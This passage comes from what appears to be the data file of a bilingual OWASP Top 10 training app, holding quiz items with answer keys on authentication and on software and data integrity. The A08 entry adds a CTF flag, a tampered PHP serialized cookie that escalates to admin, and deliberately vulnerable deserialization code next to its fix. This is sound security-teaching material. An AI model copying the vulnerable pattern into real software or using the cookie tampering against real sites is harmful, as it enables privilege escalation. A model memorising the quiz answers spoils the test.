          M('Генерация множества токенов и статистический анализ на предсказуемость/паттерны (например, инкрементность, временная зависимость)', 'Generating many tokens and statistically analyzing them for predictability/patterns (e.g., incrementing, time-dependence)'),
        ],
        ans: 3,
        e: M('Энтропию токена сброса проверяют массовой генерацией и статистикой на предсказуемость (инкремент, время), а не «на глаз» по длине.', 'Reset-token entropy is tested by generating many tokens and analyzing predictability (increments, time dependence), not by eyeballing length.'),
      },
      {
        q: M('Согласно принципам A07, аутентификация API (машина-машина) должна использовать:', 'Per A07 principles, API (machine-to-machine) authentication should use:'),
        opts: [
          M('короткоживущие токены (например, OAuth2 client credentials flow) с возможностью ротации и отзыва', 'short-lived tokens (e.g., OAuth2 client credentials flow) with the ability to rotate and revoke'),
          M('отсутствие аутентификации для внутренних сервисов', 'no authentication at all for internal services'),
          M('простой статический API-ключ без ротации навсегда', 'a simple static API key with no rotation, forever'),
          M('пароль пользователя, переданный в заголовке', 'a user\'s password passed in a header'),
        ],
        ans: 0,
        e: M('Для machine-to-machine API предпочтительны короткоживущие токены (например OAuth2 client credentials) с ротацией и отзывом, а не вечные статические ключи.', 'Machine-to-machine APIs should use short-lived tokens (e.g. OAuth2 client credentials) with rotation and revocation, not eternal static keys.'),
      },
      {
        q: M('Что из перечисленного описывает «broken remember-me функциональность»?', 'Which of the following describes "broken remember-me functionality"?'),
        opts: [
          M('Не связано с аутентификацией', 'It\'s unrelated to authentication'),
          M('Долгоживущий токен «remember me» хранится/передаётся небезопасно (например, предсказуемо генерируется или не привязан к устройству), позволяя account takeover при краже', 'The long-lived "remember me" token is stored/transmitted insecurely (e.g., predictably generated or not device-bound), enabling account takeover if stolen'),
          M('Remember-me не существует как концепция', 'Remember-me isn\'t a real concept'),
          M('Remember-me всегда безопасен', 'Remember-me is always safe'),
        ],
        ans: 1,
        e: M('Сломанный remember-me — это долгоживущий, предсказуемый или не привязанный к устройству токен, кража которого даёт полный account takeover.', 'Broken remember-me means a long-lived, predictable, or non-device-bound token whose theft yields full account takeover.'),
      },
      {
        q: M('Почему связка «логин + пароль без MFA» для административных панелей особенно рискованна?', 'Why is "login + password with no MFA" for admin panels especially risky?'),
        opts: [
          M('Административные панели не являются целью атак', 'Admin panels aren\'t attack targets'),
          M('Административные панели всегда изолированы физически', 'Admin panels are always physically isolated'),
          M('Компрометация единственного фактора (пароля) администратора даёт полный контроль над системой, а не только над данными одного пользователя', 'Compromising the single factor (the admin\'s password) grants full system control, not just one user\'s data'),
          M('MFA не поддерживается для админ-панелей технически', 'MFA isn\'t technically supported for admin panels'),
        ],
        ans: 2,
        e: M('Админ-панель без MFA критична: компрометация одного пароля даёт контроль над всей системой, а не только данными одного пользователя.', 'Admin panels without MFA are high impact: one stolen password often yields full system control, not just one user’s data.'),
      },
      {
        q: M('Атака account enumeration через форму регистрации (сообщение «этот email уже зарегистрирован») — риск, потому что:', 'Account enumeration via a registration form ("this email is already registered") is a risk because:'),
        opts: [
          M('относится только к SQL Injection', 'it relates only to SQL Injection'),
          M('требует физического доступа', 'it requires physical access'),
          M('не является уязвимостью', 'it isn\'t a vulnerability'),
          M('позволяет атакующему составить список валидных email/логинов для последующей целевой атаки (credential stuffing, фишинг)', 'it lets an attacker compile a list of valid emails/logins for a subsequent targeted attack (credential stuffing, phishing)'),
        ],
        ans: 3,
        e: M('Сообщение «email уже зарегистрирован» перечисляет валидные адреса для последующего stuffing и фишинга.', '“Email already registered” enumerates valid addresses for later credential stuffing and phishing.'),
      },
      {
        q: M('Что из перечисленного — правильная практика при обнаружении утечки пароля пользователя в базе известных компрометаций (например, через интеграцию с HIBP)?', 'Which of the following is the correct action upon discovering a user\'s password in a known-breach database (e.g., via an HIBP integration)?'),
        opts: [
          M('Проактивно уведомить пользователя и/или принудить смену пароля при следующем входе', 'Proactively notify the user and/or force a password change on next login'),
          M('Заблокировать аккаунт навсегда без объяснений', 'Permanently block the account with no explanation'),
          M('Автоматически сгенерировать новый пароль и отправить в открытом виде по email', 'Auto-generate a new password and email it in plaintext'),
          M('Игнорировать событие', 'Ignore the event'),
        ],
        ans: 0,
        e: M('При обнаружении пароля в базе утечек нужно уведомить пользователя и/или принудить смену при следующем входе, а не игнорировать и не слать plaintext-пароль по email.', 'If a password appears in a breach list, notify the user and/or force a change on next login—do not ignore it or email a new plaintext password.'),
      },
      {
        q: M('JWT с чрезмерно долгим сроком действия (exp далеко в будущем) и без механизма отзыва (revocation) представляет риск, потому что:', 'A JWT with an excessively long expiration (exp far in the future) and no revocation mechanism is a risk because:'),
        opts: [
          M('Требуется только для мобильных приложений', 'Only relevant for mobile apps'),
          M('украденный токен остаётся валидным весь оставшийся срок действия без возможности его инвалидировать со стороны сервера', 'a stolen token remains valid for the rest of its lifetime with no way for the server to invalidate it'),
          M('JWT не поддерживает exp', 'JWT doesn\'t support exp'),
          M('не является риском при использовании HTTPS', 'it isn\'t a risk when HTTPS is used'),
        ],
        ans: 1,
        e: M('Долгий JWT без revocation оставляет украденный токен валидным до exp; сервер не может быстро отрезать доступ.', 'A long-lived JWT without revocation stays valid until exp if stolen; the server cannot promptly cut off access.'),
      },
      {
        q: M('Что из перечисленного — правильная стратегия защиты форм логина от автоматизированных ботов без ухудшения UX для людей?', 'Which of the following is a correct strategy for protecting login forms from automated bots without hurting UX for real humans?'),
        opts: [
          M('Блокировка всех пользователей после первой ошибки', 'Blocking all users after their first mistake'),
          M('Полный отказ от какой-либо защиты', 'No protection at all'),
          M('Комбинация невидимых поведенческих проверок (например, honeypot-поля, оценка риска на основе паттерна поведения) с CAPTCHA только при подозрительной активности', 'A combination of invisible behavioral checks (e.g., honeypot fields, risk scoring based on behavior patterns) with CAPTCHA only when activity looks suspicious'),
          M('Классическая визуальная CAPTCHA на каждой попытке для всех', 'A classic visual CAPTCHA on every attempt for everyone'),
        ],
        ans: 2,
        e: M('Невидимые honeypot/risk-оценки плюс CAPTCHA только при аномалии защищают от ботов без постоянного UX-штрафа для людей.', 'Invisible honeypots and risk scoring with CAPTCHA only on suspicious activity block bots without punishing every human login.'),
      },
      {
        q: M('Согласно OWASP, «Weak Credential Recovery and Forgot Password process» относится к:', 'Per OWASP, "Weak Credential Recovery and Forgot Password process" belongs to:'),
        opts: [
          M('A05 Injection', 'A05 Injection'),
          M('A09 Logging Failures', 'A09 Logging Failures'),
          M('A02 Misconfiguration', 'A02 Misconfiguration'),
          M('A07 Authentication Failures, так как это часть общего процесса подтверждения личности', 'A07 Authentication Failures, as it\'s part of the overall identity-confirmation process'),
        ],
        ans: 3,
        e: M('Слабый forgot-password/recovery — часть процесса подтверждения личности, поэтому OWASP относит его к A07 Authentication Failures.', 'Weak credential recovery is part of proving identity, so OWASP places it under A07 Authentication Failures.'),
      },
      {
        q: M('Почему единая точка аутентификации (SSO) при правильной реализации МОЖЕТ снижать риск Authentication Failures в организации, несмотря на «единую точку отказа»?', 'Why CAN a single sign-on point (SSO), when properly implemented, reduce an organization\'s overall Authentication Failure risk, despite being a "single point of failure"?'),
        opts: [
          M('Централизация позволяет последовательно применять сильные политики (MFA, мониторинг аномалий) во всех системах сразу, вместо разрозненных слабых реализаций в каждом приложении', 'Centralization lets you consistently enforce strong policies (MFA, anomaly monitoring) across every system at once, instead of scattered, weaker implementations per app'),
          M('SSO не влияет на безопасность вообще', 'SSO has no effect on security at all'),
          M('SSO заменяет необходимость шифрования', 'SSO replaces the need for encryption'),
          M('SSO всегда снижает безопасность', 'SSO always reduces security'),
        ],
        ans: 0,
        e: M('Правильно внедрённый SSO централизует MFA и мониторинг аномалий для всех приложений, снижая разрозненные слабые реализации, несмотря на единую точку отказа.', 'Well-implemented SSO centralizes MFA and anomaly monitoring across apps, reducing scattered weak auth, even though it is a single point of failure.'),
      },
      {
        q: M('Атакующий, получивший доступ к hash пароля через утечку БД, но не может его расшифровать напрямую — какая атака наиболее вероятна следующей?', 'An attacker who obtains a password hash from a database leak but can\'t decrypt it directly — what\'s the most likely next attack?'),
        opts: [
          M('SSRF', 'SSRF'),
          M('Offline brute-force/rainbow table атака на хеш (связано также с A04)', 'An offline brute-force/rainbow-table attack on the hash (also related to A04)'),
          M('Clickjacking', 'Clickjacking'),
          M('CSRF', 'CSRF'),
        ],
        ans: 1,
        e: M('Имея hash из утечки БД, атакующий обычно ведёт offline brute-force или rainbow-table атаку (также пересечение с A04 Cryptographic Failures).', 'With a leaked password hash, the next step is typically offline brute-force or rainbow-table cracking (also overlapping A04 Cryptographic Failures).'),
      },
      {
        q: M('Что из перечисленного — правильная практика в отношении «security questions» (секретных вопросов), если организация всё же вынуждена их использовать (legacy-системы)?', 'Which of the following is best practice regarding "security questions" if an organization is still forced to use them (legacy systems)?'),
        opts: [
          M('Использовать их как единственный фактор восстановления доступа', 'Use them as the sole account-recovery factor'),
          M('Делать ответы обязательными и неизменными навсегда', 'Make answers mandatory and unchangeable forever'),
          M('Использовать их только как дополнительный (не единственный) фактор, с возможностью пользователя задать собственный непредсказуемый вопрос, а не выбрать из стандартного списка', 'Use them only as an additional (not sole) factor, allowing the user to write their own unpredictable question rather than pick from a standard list'),
          M('Хранить ответы в открытом виде для быстрого доступа поддержки', 'Store answers in plaintext for quick support access'),
        ],
        ans: 2,
        e: M('Если security questions неизбежны в legacy, они должны быть лишь доп. фактором, с пользовательским непредсказуемым вопросом, а не единственным путём восстановления.', 'If security questions must remain on legacy systems, use them only as an extra factor with user-written unpredictable questions, never as sole recovery.'),
      },
      {
        q: M('Почему тестирование «broken authentication» на пентесте должно включать проверку логики password reset отдельно от логики login?', 'Why should pentest testing of "broken authentication" cover the password-reset flow separately from the login flow?'),
        opts: [
          M('Это одно и то же, отдельная проверка не нужна', 'They\'re the same thing, no separate testing needed'),
          M('Требуется только для мобильных приложений', 'Only required for mobile apps'),
          M('Password reset никогда не тестируется', 'Password reset is never tested'),
          M('Процесс password reset часто имеет собственные, менее протестированные уязвимости (предсказуемые токены, отсутствие rate limiting, user enumeration), отличные от логики самого входа', 'The password-reset process often has its own, less-tested vulnerabilities (predictable tokens, missing rate limiting, user enumeration) distinct from the login logic itself'),
        ],
        ans: 3,
        e: M('Password reset часто имеет отдельные баги: слабые токены, нет rate limit, enumeration — их нужно тестировать отдельно от login.', 'Password-reset flows often have distinct flaws—weak tokens, no rate limit, enumeration—so they must be tested separately from login.'),
      },
      {
        q: M('Что из перечисленного — пример корректного поведения при вводе неверного MFA-кода несколько раз подряд?', 'Which of the following is correct behavior when an incorrect MFA code is entered multiple times in a row?'),
        opts: [
          M('Применить rate limiting/временную блокировку ввода MFA-кода аналогично защите от брутфорса пароля', 'Apply rate limiting/a temporary lockout on MFA code entry, analogous to password brute-force protection'),
          M('Отключить MFA после третьей неудачной попытки', 'Disable MFA after the third failed attempt'),
          M('Разрешить бесконечное число попыток без ограничений', 'Allow unlimited attempts'),
          M('Автоматически отправить правильный код на email в открытом виде', 'Automatically email the correct code in plaintext'),
        ],
        ans: 0,
        e: M('Повторный неверный MFA-код нужно ограничивать rate limiting/временным lockout так же, как брутфорс пароля, а не отключать MFA.', 'Repeated wrong MFA codes need rate limiting or temporary lockout like password brute force—not unlimited tries or disabling MFA.'),
      },
      {
        q: M('Какая мера НАИБОЛЕЕ комплексно снижает риск категории Authentication Failures для организации в целом?', 'Which measure MOST comprehensively reduces an organization\'s overall Authentication Failure risk?'),
        opts: [
          M('Отключение возможности сброса пароля вообще', 'Disabling password reset entirely'),
          M('Обязательный MFA (предпочтительно WebAuthn/FIDO2) + делегирование к проверенному IdP + rate limiting/lockout + короткоживущие ротируемые токены с возможностью отзыва', 'Mandatory MFA (preferably WebAuthn/FIDO2) + delegation to a proven IdP + rate limiting/lockout + short-lived, rotatable, revocable tokens'),
          M('Использование только длинных session ID без других мер', 'Using only long session IDs with no other measures'),
          M('Требование сложного пароля с обязательной сменой каждые 30 дней', 'Requiring a complex password with mandatory 30-day rotation'),
        ],
        ans: 1,
        e: M('Комплексная защита A07: обязательный MFA (лучше WebAuthn/FIDO2), проверенный IdP, rate limiting/lockout и короткоживущие отзываемые токены.', 'The strongest A07 posture combines mandatory MFA (preferably WebAuthn/FIDO2), a proven IdP, rate limiting/lockout, and short-lived revocable tokens.'),
      },
    ],
  },
  {
    code: 'A08', name: 'Software & Data Integrity', nameRu: 'Нарушение целостности ПО',
    risk: 'HIGH', owasp2021: 'A08', owasp2025: 'A08',
    cwe: ['CWE-502', 'CWE-494', 'CWE-345'],
    flag: 'FLAG{insecure_deser_role_admin}',
    blurb: M('Небезопасная десериализация, неподписанные обновления и компрометация CI/CD.', 'Insecure deserialization, unsigned updates, CI/CD poison.'),
    theory: M(
`<p><strong>Software and Data Integrity Failures</strong> — нет проверки целостности обновлений, сериализованных объектов, CI/CD.</p>
<div class="ebox">// PHP cookie
O:4:"User":2:{s:4:"role";s:4:"user";}
// attacker:
O:4:"User":2:{s:4:"role";s:5:"admin";}</div>
<p>Java gadget chains → RCE. XZ backdoor CVE-2024-3094 — supply chain.</p>`,
`<p><strong>Software and Data Integrity Failures</strong> — no integrity checks on updates, serialized objects, CI/CD.</p>
<div class="ebox">// PHP cookie
O:4:"User":2:{s:4:"role";s:4:"user";}
// attacker:
O:4:"User":2:{s:4:"role";s:5:"admin";}</div>
<p>Java gadget chains → RCE. XZ backdoor CVE-2024-3094 — supply chain.</p>`
    ),
    vulnCode: `// Trust client-side serialized object
const user = unserialize(req.cookies.profile);
if (user.role === 'admin') grantAdmin();`,
    fixCode: `// Don't deserialize untrusted data
// Use JSON + server-side session + HMAC
const data = JSON.parse(req.cookies.profile);
if (!hmacVerify(data, SIG)) reject();
// role ALWAYS from DB, never from client`,
    quiz: [
      {
        q: M('Ключевое отличие A08 от A03 (Supply Chain Failures):', 'The key difference between A08 and A03 (Supply Chain Failures):'),
        opts: [
          M('Это одна и та же категория', 'They\'re the same category'),
          M('A03 относится только к веб-приложениям', 'A03 applies only to web applications'),
          M('A08 — про верификацию целостности конкретного артефакта/данных (более низкий уровень), A03 — про весь процесс/экосистему supply chain', 'A08 covers verifying the integrity of a specific artifact/data (a lower level), A03 covers the entire supply chain process/ecosystem'),
          M('A08 относится только к базам данных', 'A08 applies only to databases'),
        ],
        ans: 2,
        e: M('A08 фокусируется на проверке целостности конкретного артефакта или данных; A03 охватывает весь процесс и экосистему supply chain.', 'A08 is about verifying integrity of a specific artifact or data; A03 covers the whole supply-chain process and ecosystem.'),
      },
      {
        q: M('Insecure deserialization опасна прежде всего потому, что:', 'Insecure deserialization is dangerous primarily because:'),
        opts: [
          M('несовместима с JSON', 'it\'s incompatible with JSON'),
          M('требует больше памяти', 'it requires more memory'),
          M('замедляет работу приложения', 'it slows down the application'),
          M('десериализация недоверенных данных без валидации структуры/типа может привести к RCE через построение gadget chain', 'deserializing untrusted data without validating its structure/type can lead to RCE via building a gadget chain'),
        ],
        ans: 3,
        e: M('Небезопасная десериализация недоверенных данных без контроля типа/структуры позволяет собрать gadget chain и получить RCE.', 'Insecure deserialization of untrusted data without type/structure controls enables gadget chains that lead to remote code execution.'),
      },
      {
        q: M('Gadget chain в контексте Java-десериализации — это:', 'A gadget chain in the context of Java deserialization is:'),
        opts: [
          M('последовательность существующих в classpath классов, которые при десериализации вредоносного объекта в комбинации приводят к выполнению произвольного кода', 'a sequence of classes already present in the classpath that, combined during deserialization of a malicious object, results in arbitrary code execution'),
          M('SQL-запрос', 'an SQL query'),
          M('сетевой протокол', 'a network protocol'),
          M('физическое устройство', 'a physical device'),
        ],
        ans: 0,
        e: M('Gadget chain — это цепочка уже существующих в classpath классов, которые при десериализации вредоносного объекта в сумме выполняют произвольный код.', 'A gadget chain is a sequence of classes already on the classpath that, during malicious deserialization, combine to run arbitrary code.'),
      },
      {
        q: M('Инструмент ysoserial используется для:', 'The ysoserial tool is used to:'),
        opts: [
          M('брутфорса паролей', 'brute-force passwords'),
          M('генерации payload\'ов для эксплуатации небезопасной десериализации в Java-приложениях', 'generate payloads for exploiting insecure deserialization in Java applications'),
          M('сканирования портов', 'scan ports'),
          M('генерации SSL-сертификатов', 'generate SSL certificates'),
        ],
        ans: 1,
        e: M('ysoserial генерирует готовые payload’ы (gadget chains) для эксплуатации небезопасной Java-десериализации.', 'ysoserial generates payloads (gadget chains) used to exploit insecure Java deserialization.'),
      },
      {
        q: M('Python pickle.loads() на недоверенных данных опасен, потому что:', 'Python\'s pickle.loads() on untrusted data is dangerous because:'),
        opts: [
          M('pickle не связан с безопасностью', 'it\'s unrelated to security'),
          M('pickle работает только с числами', 'pickle only works with numbers'),
          M('формат pickle может содержать инструкции, исполняемые при десериализации, что позволяет RCE через вредоносный сериализованный объект', 'the pickle format can contain instructions executed during deserialization, enabling RCE via a malicious serialized object'),
          M('pickle не поддерживается в Python 3', 'pickle isn\'t supported in Python 3'),
        ],
        ans: 2,
        e: M('Формат pickle может нести исполняемые инструкции, поэтому pickle.loads() на недоверенных данных даёт RCE.', 'The pickle format can embed executable instructions, so pickle.loads() on untrusted data enables RCE.'),
      },
      {
        q: M('SRI (Subresource Integrity) для сторонних скриптов с CDN защищает от:', 'SRI (Subresource Integrity) for third-party CDN scripts protects against:'),
        opts: [
          M('XSS через формы', 'XSS via forms'),
          M('CSRF', 'CSRF'),
          M('SQL Injection', 'SQL Injection'),
          M('выполнения подменённого/скомпрометированного скрипта, так как браузер сверяет хеш загруженного файла с ожидаемым', 'execution of a tampered/compromised script, since the browser checks the loaded file\'s hash against the expected one'),
        ],
        ans: 3,
        e: M('SRI заставляет браузер сверить хеш CDN-скрипта с ожидаемым и не исполнять подменённый файл.', 'SRI makes the browser compare the CDN script’s hash to the expected value and refuse to run a tampered file.'),
      },
      {
        q: M('Атрибут integrity в теге <script> задаёт:', 'The integrity attribute on a <script> tag specifies:'),
        opts: [
          M('криптографический хеш ожидаемого содержимого файла для верификации браузером перед исполнением', 'a cryptographic hash of the expected file content, for the browser to verify before executing it'),
          M('кодировку файла', 'the file\'s encoding'),
          M('язык скрипта', 'the script\'s language'),
          M('версию скрипта', 'the script\'s version'),
        ],
        ans: 0,
        e: M('Атрибут integrity задаёт криптографический хеш ожидаемого содержимого; браузер проверяет его до исполнения скрипта.', 'The integrity attribute holds a cryptographic hash of the expected content for the browser to verify before script execution.'),
      },
      {
        q: M('Что из перечисленного — пример недостаточной проверки целостности auto-update механизма?', 'Which of the following is an example of insufficient integrity checking in an auto-update mechanism?'),
        opts: [
          M('Использование staged rollout', 'Using staged rollout'),
          M('Загрузка и установка обновления с CDN без проверки подписи/хеша, полагаясь только на HTTPS-соединение', 'Downloading and installing an update from a CDN without verifying its signature/hash, relying solely on an HTTPS connection'),
          M('Логирование каждого обновления', 'Logging every update'),
          M('Проверка цифровой подписи обновления перед установкой', 'Verifying the update\'s digital signature before installation'),
        ],
        ans: 1,
        e: M('Установка auto-update только по HTTPS без проверки подписи/хеша не доказывает, что файл не подменён на источнике.', 'Fetching auto-updates over HTTPS alone without signature/hash checks does not prove the file was not swapped at the source.'),
      },
      {
        q: M('Почему «HTTPS-соединение само по себе» не гарантирует целостность содержимого обновления?', 'Why doesn\'t "an HTTPS connection alone" guarantee an update\'s content integrity?'),
        opts: [
          M('HTTPS вообще не защищает данные', 'HTTPS provides no data protection at all'),
          M('HTTPS автоматически проверяет подпись файла', 'HTTPS automatically verifies the file\'s signature'),
          M('HTTPS защищает канал передачи (от MITM), но не гарантирует, что сам источник (сервер/CDN) не скомпрометирован и не раздаёт вредоносный файл легитимно', 'HTTPS secures the transport channel (against MITM), but doesn\'t guarantee the source itself (server/CDN) hasn\'t been compromised and isn\'t legitimately serving a malicious file'),
          M('Не является правдой, HTTPS решает эту проблему полностью', 'It\'s false; HTTPS fully solves this problem'),
        ],
        ans: 2,
        e: M('HTTPS защищает канал от MITM, но не гарантирует, что сам сервер/CDN не скомпрометирован и не отдаёт вредоносный артефакт.', 'HTTPS protects the transport from MITM but does not guarantee the origin server/CDN is uncompromised and serving a clean artifact.'),
      },
      {
        q: M('.NET BinaryFormatter считается устаревшим и небезопасным для десериализации недоверенных данных, потому что:', '.NET BinaryFormatter is considered obsolete and unsafe for deserializing untrusted data because:'),
        opts: [
          M('он слишком медленный', 'it\'s too slow'),
          M('он не поддерживает Unicode', 'it doesn\'t support Unicode'),
          M('он несовместим с .NET Core', 'it\'s incompatible with .NET Core'),
          M('он исторически многократно эксплуатировался через gadget chains для RCE, поэтому Microsoft рекомендует отказаться от него', 'it\'s been repeatedly exploited historically via gadget chains for RCE, so Microsoft recommends avoiding it'),
        ],
        ans: 3,
        e: M('BinaryFormatter многократно эксплуатировался через gadget chains для RCE; Microsoft объявила его устаревшим и небезопасным для недоверенных данных.', 'BinaryFormatter has been repeatedly exploited via gadget chains for RCE; Microsoft marks it obsolete and unsafe for untrusted input.'),
      },
      {
        q: M('Что из перечисленного — правильная альтернатива небезопасной десериализации, если избежать её полностью невозможно?', 'Which of the following is a proper alternative to insecure deserialization when it can\'t be avoided entirely?'),
        opts: [
          M('Изоляция/sandbox процесса десериализации + строгая схема валидации структуры перед десериализацией', 'Isolating/sandboxing the deserialization process + strict schema validation of structure before deserializing'),
          M('Отключение логирования', 'Disabling logging'),
          M('Увеличение памяти сервера', 'Increasing server memory'),
          M('Использование pickle для всех данных без ограничений', 'Using pickle for all data with no restrictions'),
        ],
        ans: 0,
        e: M('Если десериализации не избежать, её нужно sandbox’ить и принимать только данные, прошедшие строгую schema-валидацию.', 'If deserialization cannot be avoided, sandbox the process and accept only data that passes strict schema validation first.'),
      },
      {
        q: M('CI/CD pipeline без контроля целостности (например, возможность неавторизованного изменения build-скрипта) относится к:', 'A CI/CD pipeline without integrity control (e.g., ability to unauthorizedly modify a build script) falls under:'),
        opts: [
          M('исключительно к A07', 'exclusively A07'),
          M('A08, так как скомпрометированный артефакт сборки затем считается доверенным ниже по цепочке', 'A08, since the compromised build artifact is then trusted downstream'),
          M('не относится к integrity вообще', 'it\'s unrelated to integrity at all'),
          M('исключительно к A02', 'exclusively A02'),
        ],
        ans: 1,
        e: M('Неавторизованное изменение build-скрипта CI/CD — A08: скомпрометированный артефакт сборки далее считается доверенным.', 'Unauthorized CI/CD build-script changes fall under A08 because the compromised build artifact is trusted downstream.'),
      },
      {
        q: M('Что из перечисленного описывает атаку на цепочку CI/CD через внедрение вредоносного шага в конфигурацию (например, GitHub Actions workflow)?', 'Which of the following describes an attack on the CI/CD chain via injecting a malicious step into the configuration (e.g., a GitHub Actions workflow)?'),
        opts: [
          M('XSS', 'XSS'),
          M('SQL Injection', 'SQL Injection'),
          M('Software Integrity Failure — скомпрометированный этап сборки может внедрить бэкдор в итоговый артефакт, который затем считается доверенным', 'Software Integrity Failure — a compromised build stage can implant a backdoor into the resulting artifact, which is then treated as trusted'),
          M('CSRF', 'CSRF'),
        ],
        ans: 2,
        e: M('Вредоносный шаг в workflow (например GitHub Actions) — Software Integrity Failure: бэкдор попадает в итоговый артефакт, которому доверяют.', 'A malicious CI workflow step is a Software Integrity Failure: a backdoor can land in the final artifact that others trust.'),
      },
      {
        q: M('Использование недоверенных сторонних плагинов (например, для CMS) без проверки происхождения/подписи относится к:', 'Using untrusted third-party plugins (e.g., for a CMS) without verifying their origin/signature relates to:'),
        opts: [
          M('исключительно A01', 'exclusively A01'),
          M('не является риском', 'it isn\'t a risk'),
          M('исключительно A03 (Supply Chain)', 'exclusively A03 (Supply Chain)'),
          M('пересечению A03 и A08 — сам процесс выбора источника (A03) и отсутствие верификации целостности конкретного плагина при установке/обновлении (A08)', 'an overlap of A03 and A08 — the choice of source itself (A03) and the lack of integrity verification for the specific plugin at install/update time (A08)'),
        ],
        ans: 3,
        e: M('Недоверенный CMS-плагин без проверки подписи пересекает A03 (выбор источника) и A08 (нет integrity-проверки артефакта при установке).', 'Untrusted CMS plugins without origin/signature checks span A03 (source choice) and A08 (no integrity check at install/update).'),
      },
      {
        q: M('Что из перечисленного — верное про десериализацию XML (например, через XStream в Java)?', 'Which of the following is true about XML deserialization (e.g., via XStream in Java)?'),
        opts: [
          M('Аналогично объектной десериализации, небезопасная обработка XML-представления объектов может привести к RCE через gadget chains, специфичные для XML-библиотек', 'Similar to object deserialization, unsafe handling of an XML representation of objects can lead to RCE via gadget chains specific to XML libraries'),
          M('XML десериализация всегда безопасна благодаря схеме XSD', 'XML deserialization is always safe thanks to an XSD schema'),
          M('XML не может быть уязвим к небезопасной десериализации', 'XML cannot be vulnerable to insecure deserialization'),
          M('Не связано с A08', 'It\'s unrelated to A08'),
        ],
        ans: 0,
        e: M('Небезопасная XML-десериализация (XStream и др.) так же, как бинарная, может дать RCE через библиотечные gadget chains.', 'Unsafe XML object deserialization (e.g. XStream) can yield RCE via library-specific gadget chains, like binary serializers.'),
      },
      {
        q: M('Digital signature (цифровая подпись) для верификации происхождения ПО/обновления работает через:', 'A digital signature for verifying the origin of software/an update works via:'),
        opts: [
          M('Base64-кодирование', 'Base64 encoding'),
          M('асимметричную криптографию — издатель подписывает приватным ключом, получатель проверяет публичным ключом издателя', 'asymmetric cryptography — the publisher signs with a private key, the recipient verifies with the publisher\'s public key'),
          M('симметричное шифрование с общим паролем', 'symmetric encryption with a shared password'),
          M('простое хеширование без ключа', 'simple hashing without a key'),
        ],
        ans: 1,
        e: M('Цифровая подпись обновления: издатель подписывает приватным ключом, клиент проверяет публичным ключом издателя (асимметрия).', 'Software signing uses asymmetric crypto: the publisher signs with a private key; clients verify with the publisher’s public key.'),
      },
      {
        q: M('Почему код-ревью перед мержем в основную ветку — мера, относящаяся к A08?', 'Why is code review before merging into the main branch a measure relevant to A08?'),
        opts: [
          M('Не связано с integrity', 'It\'s unrelated to integrity'),
          M('Требуется только для open-source проектов', 'Only required for open-source projects'),
          M('Независимая проверка снижает риск, что скомпрометированный или недобросовестный коммит (нарушающий целостность кодовой базы) попадёт в production незамеченным', 'Independent review reduces the risk that a compromised or malicious commit (breaking codebase integrity) reaches production unnoticed'),
          M('Ускоряет разработку', 'It speeds up development'),
        ],
        ans: 2,
        e: M('Code review перед merge снижает риск, что вредоносный или скомпрометированный коммит нарушит целостность кодовой базы незаметно.', 'Pre-merge code review reduces the chance a malicious or compromised commit breaks codebase integrity unnoticed.'),
      },
      {
        q: M('Deserialization gadget в .NET, Java, PHP чаще всего эксплуатируется через:', 'A Java/.NET/PHP deserialization gadget is most often exploited via:'),
        opts: [
          M('невозможна эксплуатация без исходного кода приложения', 'it\'s impossible without access to the app\'s source code'),
          M('только встроенные примитивы языка', 'only built-in language primitives'),
          M('только кастомные, редкие библиотеки', 'only custom, rare libraries'),
          M('стандартные, широко используемые библиотеки в classpath/зависимостях, чьи классы можно скомбинировать в цепочку без необходимости добавлять собственный код', 'standard, widely used libraries already in the classpath/dependencies, whose classes can be combined into a chain without needing to add custom code'),
        ],
        ans: 3,
        e: M('Gadget’ы обычно собирают из популярных библиотек уже в classpath, без добавления своего кода в приложение.', 'Deserialization gadgets usually chain classes from common libraries already on the classpath, without custom app code.'),
      },
      {
        q: M('Что из перечисленного — риск, специфичный именно для «software update mechanism» (а не для процесса разработки в целом)?', 'Which of the following is a risk specific to the "software update mechanism" (rather than the development process in general)?'),
        opts: [
          M('Отсутствие проверки подписи при получении и установке обновления клиентом (thick client, IoT-устройство, плагин)', 'Missing signature verification when a client (thick client, IoT device, plugin) fetches and installs an update'),
          M('Слабый пароль администратора', 'A weak admin password'),
          M('SQL-инъекция в форме логина', 'SQL injection in a login form'),
          M('Отсутствие CSP', 'Missing CSP'),
        ],
        ans: 0,
        e: M('Специфика update-механизма — отсутствие проверки подписи при скачивании и установке обновления клиентом (desktop, IoT, плагин).', 'Update-mechanism risk is specifically missing signature verification when a client (desktop, IoT, plugin) installs an update.'),
      },
      {
        q: M('Почему изолированные (immutable) build-окружения снижают риск integrity failure в CI/CD?', 'Why do isolated (immutable) build environments reduce CI/CD integrity risk?'),
        opts: [
          M('Требуются только для мобильных приложений', 'Only required for mobile apps'),
          M('Предотвращают персистентную компрометацию build-агента между сборками — каждая сборка стартует с чистого, известного состояния', 'They prevent persistent compromise of a build agent across builds — each build starts from a clean, known state'),
          M('Не влияют на безопасность', 'They have no effect on security'),
          M('Замедляют сборку', 'They slow builds down'),
        ],
        ans: 1,
        e: M('Immutable/изолированные build-среды стартуют каждую сборку из чистого состояния и не дают закрепить компрометацию агента между job’ами.', 'Immutable isolated build environments start each job from a clean known state, blocking persistent build-agent compromise.'),
      },
      {
        q: M('SLSA (Supply-chain Levels for Software Artifacts) framework относится к:', 'The SLSA (Supply-chain Levels for Software Artifacts) framework relates to:'),
        opts: [
          M('языку программирования', 'a programming language'),
          M('протоколу аутентификации', 'an authentication protocol'),
          M('стандарту/фреймворку для обеспечения верифицируемой целостности и происхождения (provenance) программных артефактов на всех уровнях сборки', 'a standard/framework for ensuring verifiable integrity and provenance of software artifacts at every build level'),
          M('алгоритму шифрования', 'an encryption algorithm'),
        ],
        ans: 2,
        e: M('SLSA — фреймворк уровней, обеспечивающих верифицируемую целостность и provenance программных артефактов по цепочке сборки.', 'SLSA is a framework of levels for verifiable integrity and provenance of software artifacts across the build chain.'),
      },
      {
        q: M('Sigstore/cosign используются для:', 'Sigstore/cosign are used for:'),
        opts: [
          M('сканирования уязвимостей', 'vulnerability scanning'),
          M('генерации паролей', 'password generation'),
          M('шифрования базы данных', 'database encryption'),
          M('подписания и верификации контейнерных образов/артефактов с целью обеспечения их целостности и происхождения', 'signing and verifying container images/artifacts to ensure their integrity and provenance'),
        ],
        ans: 3,
        e: M('Sigstore/cosign подписывают и проверяют контейнерные образы и артефакты, подтверждая их целостность и происхождение.', 'Sigstore/cosign sign and verify container images and artifacts to establish integrity and provenance.'),
      },
      {
